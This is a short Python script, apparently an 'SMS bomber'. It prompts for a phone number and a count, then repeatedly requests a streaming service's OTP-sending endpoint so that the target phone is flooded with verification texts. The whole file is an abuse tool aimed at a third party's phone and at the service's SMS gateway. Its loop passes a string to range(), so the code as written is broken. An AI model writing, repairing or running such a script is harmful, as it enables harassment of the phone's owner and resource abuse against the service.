import requests

#GET
number=str(input(" Enter Your Number : "))

amount=str(input(" Enter Your Amount : "))

api="https://stage.bioscopelive.com/en/login/send-otp?phone=88"+number+"&operator=bd-otp"

for i in range(amount):
    requests.get(api)
    print(str(i+1)+"Send SMS")
